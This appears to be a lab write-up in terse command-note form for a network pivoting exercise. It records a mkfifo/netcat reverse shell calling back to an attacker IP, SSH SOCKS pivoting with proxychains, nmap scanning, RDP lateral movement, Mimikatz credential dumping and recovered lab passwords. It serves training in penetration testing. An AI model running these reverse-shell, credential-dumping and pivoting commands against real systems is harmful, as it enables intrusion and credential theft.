# connect to webshell on 10.129.170.83 throug firefox

# grab note from webadmin

# grab second subnetwork address CIDR /16 (OMG..)
172.16.5.15
```

```
# enumerate subnetwork (try first 172.16.5.0 CIDR /24 because current instance already in it)
for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done

# not helped, but I noticed that on forum these target instances in the same /24 subnetwork 
# so web shell not working correctly with this ping oneliner.
# Also tried to ping all /16 network same result

for j in {0..255}; do for i in {1..254}; do (ping -c 1 172.16.$j.$i | grep "bytes from" &) done done

# Decided to apply reverse shell or web shell

sudo nc -nlvp 1234                                                                      # Listener on PenTest host
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.136 1234 >/tmp/f         # Make io pipe on web shell
python3 -c 'import pty; pty.spawn("/bin/bash")'                                         # Upgrade to bash

# First, simple (at the same /24 address) ping oneliner get results:
172.16.5.15
172.16.5.35   # correct for answer

# Trying to establish clean ssh to webserver for test under webadmin and id-rsa private key for pivotin:
sudo ssh webadmin@10.129.170.83 -i id_rsa                             # Login is working (w/o pass)

# Using Dynamic ssh to pivot through the webserver to 1st (I think) target host
sudo ssh -D 9050 webadmin@10.129.170.83 -i id_rsa                     # Again from Pentest Host

# Checking that in /etc/proxychains.conf we have "127.0.0.1 9050" line in the end

# Enumarating ports with proxychains against target host
proxychains nmap -v -Pn -sT 172.16.5.35

# Get open ports:
22/tcp   open  ssh
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
```

# Trying with RDP first and known creds, ctf on disk C:
proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Huan work!'

# Next just made a bad trick and try all users as an answer (there is not much of them)
# Better to check them with LSASS and mimikatz (one user has 'null' password I assume or so) but I have no time.
mimikatz.exe privilege::debug  sekurlsa::logonpasswords

# Next check NIC's and 
ipconfig            # Get second NIC 172.16.6.35
ping 172.16.6.35    # OK

# Next I noticed "..enumerate the networks.." in question and CMD ping oneliner is working faster:
# So need to scan several networks from different hosts I think
# Scan first subnetwork from host 172.16.5.35:
for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"   # get 172.16.5.15 and 172.16.6.35 (current)

# Decided to switch on second subnetwork ..
# Actually I confused here.. better I'd use mimizkatz first.. 
# For 'vfrank' user Pass in kerberos section: 'Imply wet masked!'
# Login with user 'vfrank' on 172.16.6.35 from 172.16.5.35 with remote desktop

# Scanning second network 172.16.6.0/24 from 172.16.6.35 and user vfrank:
for /L %i in (1 1 254) do ping 172.16.6.%i -n 1 -w 100 | find "Reply"   # found 172.16.6.25 and 172.16.6.35 (current)

# RDP to 172.16.6.25 from 172.16.6.35 under the same vfrank creds
# ctf in C:/ and in network share

# Full pivot map :
10.129.170.83(webadmin/web-shell/reverse-shell) -> 172.16.5.35(mlefay/RDP/mimikatz) -> 172.16.6.35(vfrank/RDP) -> 172.16.6.25(vfrank/RDP)
```
